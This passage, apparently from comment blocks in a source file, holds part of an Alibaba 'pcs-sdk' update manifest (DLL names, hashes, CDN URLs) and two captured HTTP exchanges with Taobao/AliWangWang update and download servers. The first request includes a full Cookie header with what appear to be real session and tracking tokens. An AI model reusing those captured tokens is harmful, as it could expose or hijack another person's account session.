<localPath>imageformats/qico.dll</localPath>
<output>./imageformats</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault_imageformats</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>ProcessScanner.dll</fileName>
<version>1.0.23.863</version>
<hash>F9CC25DE0151A4E6A339AF3954FD14A0</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/ProcessScanner.dll</serverPath>
<localPath>ProcessScanner.dll</localPath>
<output>./</output>
<flag>-1</flag>
<target>PlaceHoldDefault</target>
<mod>Standard,SESvr</mod>
</file>
<file>
<fileName>DBEngine.dll</fileName>
<version>1.0.23.863</version>
<hash>80427C642B4EA5C247546F798831E986</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/DBEngine.dll</serverPath>
<localPath>DBEngine.dll</localPath>
<output>./</output>
<flag>-1</flag>
<target>PlaceHoldDefault</target>
<mod>Standard,SESvr</mod>
</file>
<file>
<fileName>2470d0cc5f3cf6d7370318f25f91322f</fileName>
<version>0.0.0.0</version>
<hash>2470D0CC5F3CF6D7370318F25F91322F</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/2470d0cc5f3cf6d7370318f25f91322f</serverPath>
<localPath>2470d0cc5f3cf6d7370318f25f91322f</localPath>
<output>./</output>
<flag>-1</flag>
<target>PlaceAlibabaProtectDT</target>
<mod>AliNDFO</mod>
</file>
<file>
<fileName>qwindows.dll</fileName>
<version>5.6.0.0</version>
<hash>FECB1EF192395473D891DE05CE499B30</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/platforms/qwindows.dll</serverPath>
<localPath>platforms/qwindows.dll</localPath>
<output>./platforms</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault_platforms</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>UpdateVirus.dll</fileName>
<version>1.0.23.863</version>
<hash>5B0DF6F24B51A70E6639D0A612795382</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/UpdateVirus.dll</serverPath>
<localPath>UpdateVirus.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>offfiltx.dll</fileName>
<version>2010.1400.4746.1000</version>
<hash>657A3958756277196765CF62070CFCB6</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/offfiltx.dll</serverPath>
<localPath>offfiltx.dll</localPath>
<output>./</output>
<flag>1</flag>
<del>1</del>
<target>PlaceHoldDefault</target>
<mod>DLP_Ecolo</mod>
</file>
<file>
<fileName>SESvr.dll</fileName>
<version>1.0.23.863</version>
<hash>8EC87EA459CB63FD6C35D3D1DFE9F67D</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/SESvr.dll</serverPath>
<localPath>SESvr.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>HttpServerLogic.dll</fileName>
<version>1.0.23.863</version>
<hash>B36A49421B8A8E73744A53C3173F2333</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/HttpServerLogic.dll</serverPath>
<localPath>HttpServerLogic.dll</localPath>
<output>./</output>
<flag>-1</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>DCert</mod>
</file>
<file>
<fileName>offfilt.dll</fileName>
<version>2008.0.7600.16385</version>
<hash>7F19AC6C30AF577BF4B1062C7C695A20</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/offfilt.dll</serverPath>
<localPath>offfilt.dll</localPath>
<output>./</output>
<flag>1</flag>
<del>1</del>
<target>PlaceHoldDefault</target>
<mod>DLP_Ecolo</mod>
</file>
<file>
<fileName>LocalDetector.dll</fileName>
<version>1.0.23.863</version>
<hash>3882DBFE31BCC76D7C8731B61183FB32</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/LocalDetector.dll</serverPath>
<localPath>LocalDetector.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>TrustManager.dll</fileName>
<version>1.0.23.863</version>
<hash>CF769C4AFB695B585BFBAFB113176956</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/TrustManager.dll</serverPath>
<localPath>TrustManager.dll</localPath>
<output>./</output>
<flag>32</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>SESvr</mod>
</file>
<file>
<fileName>DTSign.dll</fileName>
<version>1.0.23.863</version>
<hash>05496061111C4552037FA1632EEE3D9F</hash>
<serverPath>http://dcldshlupt.alicdn.com/data/pcs-sdk/1.0.23.863/SoftPackage/DTSign.dll</serverPath>
<localPath>DTSign.dll</localPath>
<output>./</output>
<flag>-1</flag>
<del>0</del>
<target>PlaceHoldDefault</target>
<mod>TokenSign</mod>
</file>
<file>
<fileName>DlpPlugin.dll</fileName>
<version>1.0.0.2</version>
<hash>189699EDB4BC64FBEAC52F66DE92BE1C</hash>

*/




/*
GET /aliwangwang/9.12.07C/dailyconfig.sys HTTP/1.1
Accept-Language: zh-cn
User-Agent: SimpleHttpFetch
Connection: Keep-Alive
Cache-Control: no-cache
Host: dailyupdate.wangwang.taobao.com
Cookie: isg=BObmTNLKhr-CgFITWazR3kx4N1yobyA2p9-VP9CP0onkU4ZtOFd6kcwirw_6fCKZ; thw=cn; t=fd7c43000f3493aa67a30d5ac78189a7; _m_h5_tk_enc=022d5c9d6e696837ae6461d0a139e695; UM_distinctid=16a66cd670e5d3-0e8b610f75c5d9-36664c08-144000-16a66cd670f7b1; miid=1281725704848387827; mt=ci%3D-1_0; cna=6LwsFRhAI18CAd9gIpIoNUNq; _m_h5_tk=761027348dfff294e8f8be415d648e7b_1545291570206; l=bBrtrq8rvkLyYsOiBOCiNuIRhXQOSIRA_uPRwRmJi_5IH6L1QKQOlBrYzFp6Vj5RsLTB4082ve99-etkw

HTTP/1.1 404 Not Found
Server: Tengine
Content-Type: text/html
Content-Length: 726
Connection: keep-alive
Date: Mon, 27 May 2019 06:25:37 GMT
ufe-result: A6
ufe-result: A6
Ali-Swift-Global-Savetime: 1558938337
Via: cache46.l2et15-1[41,404-1280,M], cache17.l2et15-1[42,0], cache8.cn1349[50,404-1280,M], cache1.cn1349[90,0]
X-Swift-Error: orig response 4XX error
X-Cache: MISS TCP_MISS dirn:-2:-2
X-Swift-SaveTime: Mon, 27 May 2019 06:25:37 GMT
X-Swift-CacheTime: 1
X-Swift-Error: orig response 4XX error
Timing-Allow-Origin: *
EagleId: 241bda9515589383376774139e

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>404 Not Found</title></head>
<body bgcolor="white">
<h1>404 Not Found</h1>
<p>The requested URL was not found on this server. Sorry for the inconvenience.<br/>
Please report this message and include the following information to us.<br/>
Thank you very much!</p>
<table>
<tr>
<td>URL:</td>
<td>http://dailyupdate.wangwang.taobao.com/aliwangwang/9.12.07C/dailyconfig.sys</td>
</tr>
<tr>
<td>Server:</td>
<td>aserver011183245254.center.na62</td>
</tr>
<tr>
<td>Date:</td>
<td>2019/05/27 14:25:37</td>
</tr>
</table>
<hr/>Powered by Tengine/Aserver</body>
</html>

*/



/*
GET /wangwang/AliIM_taobao_(9.12.10C).exe?spm=a21e4.8038711.0.0.4436297dN4Gjxy&file=AliIM_taobao_(9.12.10C).exe HTTP/1.1
Host: download.alicdn.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*//*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36
Referer: https://alimarket.taobao.com/markets/qnww/portal-group/ww/index?spm=a21e4.8028256.0.0.3716352cupEmkv
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/octet-stream
Content-Length: 74014232
Connection: keep-alive
Date: Mon, 23 Mar 2020 03:12:54 GMT
x-oss-request-id: 5E78293659CCFC33352AFC94
Accept-Ranges: bytes
ETag: "548FE76C892C83CEC71ED55FB7A763A5"
Last-Modified: Wed, 07 Aug 2019 04:10:45 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 5528264595518321279
x-oss-storage-class: Standard
x-oss-meta-md5: 548fe76c892c83cec71ed55fb7a763a5
Cache-Control: max-age=86400
Content-MD5: VI/nbIksg87HHtVft6djpQ==
x-oss-server-time: 52
Via: cache20.l2eu6-1[0,304-0,H], cache12.l2eu6-1[1,0], cache18.cn1906[0,200-0,H], cache17.cn1906[2,0]
Ali-Swift-Global-Savetime: 1576832573
Age: 17531
X-Cache: HIT TCP_MEM_HIT dirn:13:81963280
X-Swift-SaveTime: Mon, 23 Mar 2020 03:13:45 GMT
X-Swift-CacheTime: 86349
Timing-Allow-Origin: *
EagleId: 65e21b2515849507053748221e

MZ
*/